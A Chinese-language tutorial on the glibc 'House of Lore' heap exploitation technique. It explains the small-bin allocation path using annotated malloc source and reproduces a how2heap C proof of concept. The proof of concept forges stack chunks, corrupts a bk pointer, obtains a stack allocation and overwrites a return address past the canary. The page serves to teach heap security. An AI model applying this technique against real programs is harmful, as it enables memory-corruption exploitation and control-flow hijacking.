# House of Lore

## 概述

House of Lore 攻擊與 Glibc 堆管理中的 Small Bin 的機制緊密相關。

House of Lore 可以實現分配任意指定位置的 chunk，從而修改任意地址的內存。

House of Lore 利用的前提是需要控制 Small Bin Chunk 的 bk 指針，並且控制指定位置 chunk 的 fd 指針。

## 基本原理

如果在 malloc 的時候，申請的內存塊在 small bin 範圍內，那麼執行的流程如下

```c
    /*
       If a small request, check regular bin.  Since these "smallbins"
       hold one size each, no searching within bins is necessary.
       (For a large request, we need to wait until unsorted chunks are
       processed to find best fit. But for small ones, fits are exact
       anyway, so we can check now, which is faster.)
     */

    if (in_smallbin_range(nb)) {
        // 獲取 small bin 的索引
        idx = smallbin_index(nb);
        // 獲取對應 small bin 中的 chunk 指針
        bin = bin_at(av, idx);
        // 先執行 victim= last(bin)，獲取 small bin 的最後一個 chunk
        // 如果 victim = bin ，那說明該 bin 爲空。
        // 如果不相等，那麼會有兩種情況
        if ((victim = last(bin)) != bin) {
            // 第一種情況，small bin 還沒有初始化。
            if (victim == 0) /* initialization check */
                // 執行初始化，將 fast bins 中的 chunk 進行合併
                malloc_consolidate(av);
            // 第二種情況，small bin 中存在空閒的 chunk
            else {
                // 獲取 small bin 中倒數第二個 chunk 。
                bck = victim->bk;
                // 檢查 bck->fd 是不是 victim，防止僞造
                if (__glibc_unlikely(bck->fd != victim)) {
                    errstr = "malloc(): smallbin double linked list corrupted";
                    goto errout;
                }
                // 設置 victim 對應的 inuse 位
                set_inuse_bit_at_offset(victim, nb);
                // 修改 small bin 鏈表，將 small bin 的最後一個 chunk 取出來
                bin->bk = bck;
                bck->fd = bin;
                // 如果不是 main_arena，設置對應的標誌
                if (av != &main_arena) set_non_main_arena(victim);
                // 細緻的檢查
                check_malloced_chunk(av, victim, nb);
                // 將申請到的 chunk 轉化爲對應的 mem 狀態
                void *p = chunk2mem(victim);
                // 如果設置了 perturb_type , 則將獲取到的chunk初始化爲 perturb_type ^ 0xff
                alloc_perturb(p, bytes);
                return p;
            }
        }
    }
```

從下面的這部分我們可以看出

```c
                // 獲取 small bin 中倒數第二個 chunk 。
                bck = victim->bk;
                // 檢查 bck->fd 是不是 victim，防止僞造
                if (__glibc_unlikely(bck->fd != victim)) {
                    errstr = "malloc(): smallbin double linked list corrupted";
                    goto errout;
                }
                // 設置 victim 對應的 inuse 位
                set_inuse_bit_at_offset(victim, nb);
                // 修改 small bin 鏈表，將 small bin 的最後一個 chunk 取出來
                bin->bk = bck;
                bck->fd = bin;
```

如果我們可以修改 small bin 的最後一個 chunk 的 bk 爲我們指定內存地址的fake chunk，並且同時滿足之後的 bck->fd != victim 的檢測，那麼我們就可以使得 small bin 的 bk 恰好爲我們構造的 fake chunk。也就是說，當下一次申請 small bin 的時候，我們就會分配到指定位置的 fake chunk。

## 示例代碼

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

void jackpot(){ puts("Nice jump d00d"); exit(0); }

int main(int argc, char * argv[]){


  intptr_t* stack_buffer_1[4] = {0};
  intptr_t* stack_buffer_2[3] = {0};

  fprintf(stderr, "\nWelcome to the House of Lore\n");
  fprintf(stderr, "This is a revisited version that bypass also the hardening check introduced by glibc malloc\n");
  fprintf(stderr, "This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\n\n");

  fprintf(stderr, "Allocating the victim chunk\n");
  intptr_t *victim = malloc(100);
  fprintf(stderr, "Allocated the first small chunk on the heap at %p\n", victim);

  // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk
  intptr_t *victim_chunk = victim-2;

  fprintf(stderr, "stack_buffer_1 at %p\n", (void*)stack_buffer_1);
  fprintf(stderr, "stack_buffer_2 at %p\n", (void*)stack_buffer_2);

  fprintf(stderr, "Create a fake chunk on the stack");
  fprintf(stderr, "Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"
         "in second to the last malloc, which putting stack address on smallbin list\n");
  stack_buffer_1[0] = 0;
  stack_buffer_1[1] = 0;
  stack_buffer_1[2] = victim_chunk;

  fprintf(stderr, "Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "
         "in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "
         "chunk on stack");
  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
  
  fprintf(stderr, "Allocating another large chunk in order to avoid consolidating the top chunk with"
         "the small one during the free()\n");
  void *p5 = malloc(1000);
  fprintf(stderr, "Allocated the large chunk on the heap at %p\n", p5);


  fprintf(stderr, "Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
  free((void*)victim);

  fprintf(stderr, "\nIn the unsorted bin the victim's fwd and bk pointers are nil\n");
  fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);

  fprintf(stderr, "Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n");
  fprintf(stderr, "This means that the chunk %p will be inserted in front of the SmallBin\n", victim);

  void *p2 = malloc(1200);
  fprintf(stderr, "The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n", p2);

  fprintf(stderr, "The victim chunk has been sorted and its fwd and bk pointers updated\n");
  fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);

  //------------VULNERABILITY-----------

  fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");

  victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack

  //------------------------------------

  fprintf(stderr, "Now allocating a chunk with size equal to the first one freed\n");
  fprintf(stderr, "This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer\n");

  void *p3 = malloc(100);


  fprintf(stderr, "This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\n");
  char *p4 = malloc(100);
  fprintf(stderr, "p4 = malloc(100)\n");

  fprintf(stderr, "\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n",
         stack_buffer_2[2]);

  fprintf(stderr, "\np4 is %p and should be on the stack!\n", p4); // this chunk will be allocated on stack
  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
  memcpy((p4+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
}
```

上面代碼已經講得非常清楚了，不再解釋。

**但是需要注意的是：**

1. `void *p5 = malloc(1000);` 是爲了防止和 victim_chunk 之後和 top_chunk合併。

2. `free((void*)victim)`，victim 會被放入到 unsort bin 中去，然後下一次分配的大小如果比它大，那麼將從 top chunk 上分配相應大小，而該 chunk 會被取下link到相應的 bin 中。如果比它小(相等則直接返回)，則從該 chunk 上切除相應大小，並返回相應 chunk，剩下的成爲 last reminder chunk ,還是存在 unsorted bin 中。

## 參考文獻

- [https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_lore.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_lore.c)